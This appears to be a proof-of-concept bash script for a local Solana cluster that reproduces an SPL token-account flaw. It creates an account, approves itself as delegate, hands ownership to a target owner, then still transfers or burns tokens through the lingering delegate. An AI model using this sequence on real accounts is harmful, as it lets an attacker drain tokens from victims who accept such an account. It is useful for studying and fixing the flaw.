#!/usr/bin/env bash

set -e

SPL_TOKEN=${SPL_TOKEN:-../solana-program-library/target/release/spl-token}
SPL_KEYGEN=${SPL_KEYGEN:-../solana/target/release/solana-keygen}

MINT=$1
TARGET_OWNER=$2
COMMON=${COMMON:-"--verbose -ul"}

BAD_ACCOUNT=$($SPL_KEYGEN grind --starts-with bad:1 --ignore-case | tail -n1 | awk '{print $4}')

$SPL_TOKEN $COMMON supply "$MINT" || $SPL_TOKEN $COMMON create-token "$MINT"
$SPL_TOKEN $COMMON create-account "$MINT" "$BAD_ACCOUNT"
$SPL_TOKEN $COMMON mint "$MINT" 10 "$BAD_ACCOUNT"
$SPL_TOKEN $COMMON account-info --address "$BAD_ACCOUNT"
$SPL_TOKEN $COMMON approve "$BAD_ACCOUNT" 999 "$BAD_ACCOUNT"
$SPL_TOKEN $COMMON account-info --address "$BAD_ACCOUNT"
$SPL_TOKEN $COMMON authorize "$BAD_ACCOUNT" owner "$TARGET_OWNER"
$SPL_TOKEN $COMMON account-info --address "$BAD_ACCOUNT"
#$SPL_TOKEN $COMMON transfer --dump-transaction-message --sign-only --blockhash $(head -c 32 /dev/urandom | base58 && echo ) --mint-decimals 6 --from "$BAD_ACCOUNT" "$MINT" 1 "$BAD_ACCOUNT"
if [[ $BURN != "" ]]
then
  $SPL_TOKEN $COMMON burn --owner "$BAD_ACCOUNT" "$BAD_ACCOUNT" 1
else
  $SPL_TOKEN $COMMON transfer --owner "$BAD_ACCOUNT" --from "$BAD_ACCOUNT" "$MINT" 1 "$BAD_ACCOUNT"
fi
$SPL_TOKEN $COMMON account-info --address "$BAD_ACCOUNT"
